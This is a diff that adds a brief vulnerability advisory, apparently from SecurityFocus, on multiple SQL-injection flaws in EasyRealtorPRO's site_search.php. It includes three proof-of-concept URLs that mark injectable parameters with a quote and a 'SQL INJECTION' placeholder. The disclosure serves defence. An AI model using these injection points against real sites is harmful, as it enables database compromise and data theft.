@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/31401/info
+
+EasyRealtorPRO is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied input before using it in an SQL query.
+
+Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+http://www.example.com/site_search.php?search_purpose=sale&search_type=&search_price_min=&search_price_max=&search_bedroom=1&search_bathroom=1&search_city=&search_state=&search_zip=&search_radius=&search_country=&search_order=type&search_ordermethod=asc&page=2&item=5'SQL INJECTION
+
+http://www.example.com/site_search.php?search_purpose=sale&search_type=&search_price_min=&search_price_max=&search_bedroom=1&search_bathroom=1&search_city=&search_state=&search_zip=&search_radius=&search_country=&search_order=type&search_ordermethod=asc'SQL INJECTION&page=2&item=5
+
+http://www.example.com/site_search.php?search_purpose=sale&search_type=&search_price_min=&search_price_max=&search_bedroom=1&search_bathroom=1&search_city=&search_state=&search_zip=&search_radius=&search_country=&search_order=type'SQL INJECTION&search_ordermethod=asc&page=2&item=5 
